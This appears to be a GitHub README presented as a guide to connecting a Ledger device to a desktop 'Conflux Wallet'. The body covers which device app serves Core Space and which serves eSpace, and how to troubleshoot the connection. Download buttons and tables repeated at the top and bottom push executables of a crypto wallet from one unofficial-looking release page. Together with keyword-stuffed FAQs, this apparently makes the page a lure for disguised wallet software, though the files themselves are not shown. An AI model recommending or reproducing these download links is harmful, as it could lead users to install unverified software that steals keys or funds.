![Conflux Wallet](assets/banner-article.png)

# Connect Ledger to Conflux Wallet

<p align="center">Connect Ledger to Conflux Wallet: the checks, in order, for the current desktop release.</p>

<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-30A0D0?style=for-the-badge&labelColor=101010" alt="License: MIT"> <img src="https://img.shields.io/badge/RELEASE-v0.6.14-30A0D0?style=for-the-badge&labelColor=101010" alt="Release v0.6.14"></p>

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

> Only download from this GitHub release page.

**Short answer.** Ledger devices are supported directly for both Core Space and eSpace: connect, unlock, open the right app on the device, and the accounts appear in the app. Core Space signs with the Conflux app, eSpace with the Ethereum app, and every transaction is approved on the device itself.

## What the wallet supports

Both major hardware families are supported, and the choice between them is about which space you work in rather than about the wallet. A Ledger reaches both spaces. A Trezor is documented for eSpace only - no evidence was found of it signing Core Space transactions.

That asymmetry decides most of the questions people bring here. If the goal is staking and `cfx:` transfers, the device has to be one that can run the Conflux app. https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/which-hardware-wallet-supports-conflux-cfx.md is the matrix, and https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/connect-trezor-to-conflux-wallet.md is the other half of it.

## Two apps on the device

A single device runs small applications, one per chain family. Core Space needs the Conflux app; eSpace signs through the Ethereum app, because eSpace is EVM-compatible and uses the same signing path.

The two produce different accounts from the same seed, which is not a bug: the same phrase derives a `cfx:` account and a `0x` account, and the app on the device is what tells the wallet which one to derive. Opening the wrong app is the most common reason an account "does not appear".

## Connecting the device

Plug it in, unlock it with the PIN, and open the relevant app before starting the connection in the current release from the release page (https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14). Then choose to connect a hardware account and pick the device from the list; the app reads the accounts the device offers and shows them for selection.

Approve the connection on the device if it asks. Nothing about this step shares a private key - the key never leaves the device, which is the entire point of the arrangement.

## Finding your CFX address

With the Conflux app open, the account the wallet shows is the Core Space account derived on the device, and its `cfx:` address is the one to receive to and to register for staking. With the Ethereum app open, the same seed yields the `0x` address you use on eSpace.

Write both down, labelled by space. They are not secret, and having them recorded is what makes a later hardware swap a comparison rather than an investigation. https://github.com/conflux-developments/setup-handbook/blob/HEAD/what-is-conflux-wallet.md explains how the app labels the space on every screen.

## Which app for which space

<div align="center">

| Space | App on the device | Address |
|---|---|---|
| Core Space | Conflux app | `cfx:` |
| eSpace | Ethereum app | `0x` |

</div>

The two accounts come from one seed and are not interchangeable: https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-core-space-vs-espace.md is the fuller explanation of why. If you are sending CFX to someone, the space decides the app you need to be in to sign. Signing a Core Space transfer while the Ethereum app is open cannot work, and the error usually arrives as a timeout rather than a clear message.

## When the Conflux app will not open

A firmware update in late 2025 stopped the Conflux Core app from opening on some Ledger models; an update to the Conflux app in October 2025 fixed it. If the app is installed but will not launch, that pairing is the first thing to check.

This is the clearest case of the general rule: the fix is to bring both sides current, not to reinstall the wallet or reset anything. Update the device firmware and the Conflux app, then try again before touching your accounts.

## When the device is not seen

Three ordinary causes. The device is locked or showing a menu rather than the open app. The cable is charge-only or the port is unreliable - a known-good data cable resolves a surprising share of these. Or the desktop app needs permission to talk to the device, which on some systems has to be granted the first time.

If the device appears but the accounts are empty, the app is open on the wrong one; switch it and re-read. https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-wallet-safety.md covers why none of these steps ever needs a phrase typed into a computer.

## Approving on the device

Every transaction signed with hardware is shown on the device screen and approved there, and that screen is the only place to trust. Read the recipient and the amount on the device rather than in the app window, because the window is what malware can change and the device is not.

If the device shows something different from the wallet, reject it. That mismatch is the signature of a clipboard or address-swapping attack, and it is precisely the case hardware signing exists to catch.

## Adding it as another chain

A Ledger account is not portable between chains in the way people hope. Deriving a Conflux account "as Ethereum" gives the eSpace account, not a Core Space one, and does not make the address an Ethereum address - CFX sent to it on Ethereum is sent to a chain that has nothing to do with it.

Adding it as some other network's chain is further from the truth, not closer. The device signs for the app that is open and the network the wallet is pointed at; everything else is a display name. Because the app is actively maintained, the current release published on the release page is the baseline for everything described here.

## FAQ

### Does Conflux Wallet support Ledger?

Yes, for both spaces: the Conflux app for Core Space and the Ethereum app for eSpace, with each transaction approved on the device.

### Which Ledger app do I need for Core Space?

The Conflux app. Without it the device cannot sign a `cfx:` transaction at all, however the wallet is configured.

### Why is my CFX address not showing?

The device is usually on the wrong app. Open the Conflux app for `cfx:` accounts and the Ethereum app for `0x` accounts, then re-read them.

### Can I add Conflux to a Ledger as Ethereum?

Only in the sense that eSpace signs with the Ethereum app. That gives you an eSpace account, not a Core Space one, and not an Ethereum address.

### Why did the Conflux app stop opening?

A firmware update in late 2025 broke it on some models; the Conflux app update in October 2025 fixed it. Update both before changing anything else.

---

## Get Conflux Wallet

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

## Related guides

- [Connect Trezor to Conflux Wallet](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/connect-trezor-to-conflux-wallet.md)
- [Hardware Wallet for CFX](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/which-hardware-wallet-supports-conflux-cfx.md)

[All Conflux Wallet guides](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)
